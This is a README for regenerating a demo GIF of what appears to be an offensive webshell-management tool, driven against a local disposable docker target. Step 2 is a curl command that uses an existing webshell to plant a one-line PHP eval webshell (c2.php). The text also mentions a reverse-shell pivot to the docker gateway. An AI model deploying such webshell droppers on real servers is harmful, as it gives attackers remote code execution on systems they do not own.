# Demo recording

`sniper.gif` (embedded in the top-level README) is generated from `driver.py`,
which drives the REPL against the local docker target and writes an asciinema v2
cast — no `asciinema rec` needed, so it runs headless.

The reel loads **two sessions** from `webshells.json` to show the Metasploit-style
session management — the second endpoint (`c2.php`) is a copy of the one-line
shell dropped onto the same disposable target.

## Regenerate

```bash
# 1. bring up the disposable target + databases (see ../docker/)
docker compose -f ../docker/docker-compose.yml up -d

# 2. drop a second webshell so we have two sessions to manage
curl -s --data-urlencode \
  "c=file_put_contents('/var/www/html/c2.php','<?php @eval(\$_POST[\"c\"]); ?>');" \
  http://127.0.0.1:8080/index.php

# 3. record the cast (spawns the REPL on a PTY and "types" the highlight reel)
python driver.py sniper.cast

# 4. render the GIF (https://github.com/asciinema/agg)
agg --theme monokai --font-size 14 --line-height 1.3 \
    --speed 1.4 --idle-time-limit 0.9 sniper.cast sniper.gif
```

The `pivot shell` step reverse-connects to the docker host gateway (`172.16.1.1`);
adjust the addresses in `driver.py` if your compose network differs.

Edit the `CMDS` list in `driver.py` to change the demo. The driver answers
terminal cursor-position queries so a prompt_toolkit/readline input loop never
stalls.
